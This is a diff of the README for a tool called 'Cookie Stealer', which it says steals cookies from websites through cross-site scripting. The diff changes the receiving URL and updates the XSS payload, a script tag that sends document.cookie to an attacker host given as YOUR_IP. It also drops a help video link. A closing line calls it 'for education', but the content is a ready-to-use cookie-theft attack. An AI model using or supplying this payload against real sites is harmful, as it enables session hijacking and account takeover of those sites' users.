@@ -1,4 +1,4 @@
-# steal-cookie
+# Cookie Stealer
 steal cookies from websites using xss :)
 
 # Requirements :
@@ -26,18 +26,15 @@ $ pip install flask
 # Cookie Path :
 
 
-````http://YOUR_IP/cookie?cookie=COOKIE```` 
+````http://YOUR_IP/cookie/<COOKIE>``` 
  
 
 # Payload :
   
   ````
-  "><script>document.location="http://YOUR_IP/cookie?cookie=" + document.cookie </script>
+  "><script>document.location="http://YOUR_IP/cookie/" + document.cookie </script>
   ````
   
-# How use it :
-<h4><a href='https://www.youtube.com/watch?v=gJ6D60jeai8&t=3s' target='_blank'>Help</a></h4>
-
 # Note :
     
 This Tool For education .. Good Luck ^_^
